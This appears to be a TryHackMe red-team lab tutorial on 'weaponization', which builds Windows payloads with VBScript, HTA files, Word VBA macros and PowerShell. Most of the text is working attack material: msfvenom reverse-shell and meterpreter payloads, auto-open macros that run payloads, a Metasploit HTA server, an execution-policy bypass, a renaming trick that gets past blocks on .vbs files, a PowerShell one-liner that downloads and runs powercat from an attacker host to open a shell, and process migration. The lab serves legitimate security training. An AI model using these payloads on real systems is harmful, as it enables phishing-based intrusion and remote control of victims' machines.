
<h2>Introduction</h2>
What is Weaponization  

Weaponization is the second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc. [[1](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)]. The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.

Most organizations have Windows OS running, which is going to be a likely target. An organization's environment policy often blocks downloading and executing .exe files to avoid security violations. Therefore, red teamers rely upon building custom payloads sent via various channels such as phishing campaigns, social engineering, browser or software exploitation, USB, or web methods.

The following graph is an example of weaponization, where a crafted custom PDF or Microsoft Office document is used to deliver a malicious payload. The custom payload is configured to connect back to the command and control environment of the red team infrastructure.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/734a353799fc9f3cd05bb7421ceedd00.png)

For more information about red team toolkits, please visit the following: a [[https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload Development]] that has it all, including initial access, payload development, delivery methods, and others.

Most organizations block or monitor the execution of .exe files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:

- The Windows Script Host (WSH)
- An HTML Application (HTA)
- Visual Basic Applications (VBA)
- PowerShell (PSH)

<h2>Windows Scripting host WSH</h2>
Windows Scripting Host (WSH)

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe. For more information about VBScript, please visit [here](https://en.wikipedia.org/wiki/VBScript). It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.

Now let's write a simple VBScript code to create a windows message box that shows the Welcome to THM message. Make sure to save the following code into a file, for example, hello.vbs.

```
Dim message 
message = "Welcome to THM"
MsgBox message
```

In the first line, we declared the message variable using Dim. Then we store a string value of Welcome to THM in the message variable. In the next line, we use the MsgBox function to show the content of the variable. For more information about the MsgBox function, please visit [here](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN). Then, we use wscript to run and execute the content of hello.vbs. As a result, A Windows message will pop up with the Welcome to THM message.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f40a7711a408932981d827bfe6e522f3.png)  

Now let's use the VBScript to run executable files. The following vbs code is to invoke the Windows calculator, proof that we can execute .exe files using the Windows native engine (WSH).

```
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

We create an object of the WScript library using CreateObject to call the execution payload. Then, we utilize the Run method to execute the payload. For this task, we will run the Windows calculator calc.exe. 

To execute the vbs file, we can run it using the wscript as follows,

```
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
```

We can also run it via cscript as follows,
```
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vb
```
As a result, the Windows calculator will appear on the Desktop.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c7cbe29ee437b83a244994621cf6996.png)  

Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,

```
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```


The result will be as exact as executing the vbs files, which run the calc.exe binary.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f6d6a5f824fa64750e8b15ce6ba07a7a.png)

<h2>An HTML Application - HTA</h2>
An HTML Application (HTA)

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 

In the following example, we will use an [ActiveXObject](https://en.wikipedia.org/wiki/ActiveX) in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.

```javascript
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,

```
user@machine$ python3 -m http.server 8090 Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

On the victim machine, visit the malicious link using Microsoft Edge, http://10.8.232.37:8090/payload.hta. Note that the 10.8.232.37 is the AttackBox's IP address.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f3a719e8137e6fdca683eefbf373ea4f.png)

Once we press Run, the payload.hta gets executed, and then it will invoke the cmd.exe. The following figure shows that we have successfully executed the cmd.exe.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/07c5180cd36650478806a1bf3d4595f2.png)

**HTA Reverse Connection**

We can create a reverse shell payload as follows,

```
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
```

We use the msfvenom from the Metasploit framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect the windows/x64/shell_reverse_tcp to our IP and listening port.

On the attacking machine, we need to listen to the port 443 using nc. Please note this port needs root privileges to open, or you can use different ones.

Once the victim visits the malicious URL and hits run, we get the connection back.

```
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```

On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection



<h2>Visual Basic for Application - VBA</h2>

Visual Basic for Application (VBA)

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.   

Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. One of VBA's features is accessing the Windows Application Programming Interface ([API](https://en.wikipedia.org/wiki/Windows_API)) and other low-level functionality. For more information about VBA, visit [here](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications). 

In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.

Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ceed0307819cf06500e6524a5f632d7.png)  

Next, make sure to accept the Microsoft Office license agreement that shows after closing the product key window.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/feb2f077507c6c242658e76ee88fb544.png)

Now create a new blank Microsoft document to create our first macro. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selecting view → macros. The Macros window shows to create our own macro within the document.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5e12755e9b891865c6ef07e25047060b.png)  

In the Macro name section, we choose to name our macro as THM. Note that we need to select from the Macros in list Document1 and finally select create. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let's try to show a message box with the following message: Welcome to Weaponization Room!. We can do that using the MsgBox function as follows:

```javascript
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Finally, run the macro by F5 or Run → Run Sub/UserForm.

Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as AutoOpen and Document_open. Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the THM function.

```javascript
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as .doc and docm. Now let's save the file as Word 97-2003 Template where the Macro is enabled by going to File → save Document1 and save as type → Word 97-2003 Document and finally, save.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5e35b7436173da709dae5695c34d4f9.png)  

Let's close the Word document that we saved. If we reopen the document file, Microsoft Word will show a security message indicating that Macros have been disabled and give us the option to enable it. Let's enable it and move forward to check out the result.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e140bfbce59d6cf3e71489dba094adc2.png)  

Once we allowed the Enable Content, our macro gets executed as shown,

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ca228c238732dcdf21139317992a0083.png)  

Now edit the word document and create a macro function that executes a calc.exe or any executable file as proof of concept as follows,  

```javascript
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

To explain the code in detail, with Dim payload As String, we declare payload variable as a string using Dim keyword. With payload = "calc.exe" we are specifying the payload name and finally with CreateObject("Wscript.Shell").Run payload we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the  AutoOpen() and Document_open() functions too.

Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create AutoOpen() and Document_open() functions before saving the document. Once the code works, now save the file and try to open it again.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5c80382621d3fcb578a9e128ca821e71.png)

It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.

Answer the questions below

Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell. First, from the AttackBox, we create our meterpreter payload using msfvenom. We need to specify the Payload, LHOST, and LPORT, which match what is in the Metasploit framework. Note that we specify the payload as VBA to use it as a macro.

```
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
```

The value of the LHOST in the above terminal is an example of AttackBox's IP address that we used. In your case, you need to specify the IP address of your AttackBox.

**Import to note** that one modification needs to be done to make this work.  The output will be working on an MS excel sheet. Therefore, change the Workbook_Open() to Document_Open() to make it suitable for MS word documents.

Now copy the output and save it into the macro editor of the MS word document, as we showed previously.

From the attacking machine, run the Metasploit framework and set the listener as follows:

```
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter >
```

<h2>Power shell PSH</h2>

PowerShell (PSH)

PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, [Hacking with PowerShell for more information about PowerShell](https://tryhackme.com/room/powershell).  

Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints "Welcome to the Weaponization Room!" as follows,

```powershell
Write-Output "Welcome to the Weaponization Room!"
```

Save the file as thm.ps1. With the Write-Output, we print the message "Welcome to the Weaponization Room!" to the command prompt. Now let's run it and see the result

```
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\thm\Desktop>
```

### Bypass Execution Policy

Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.  

In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows,

```
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!
```

Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.

```
user@machine$ git clone https://github.com/besimorhino/powercat.git
```

```
user@machine$ cd powercat user@machine$ python3 -m http.server 8080 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```


### Practice Arena


We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://10.10.140.41:8080/.

Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/d92b185b39570d4740e6f6a8e905124a.png)  

The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link.

**Note for Doc files**: the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. 

In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow,

```
meterpreter > run post/windows/manage/migrate 

[*] Running module against DESKTOP-1AU6NT4
[*] Current server process: svchost.exe (3280)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 4960
[+] Successfully migrated into process 4960
```


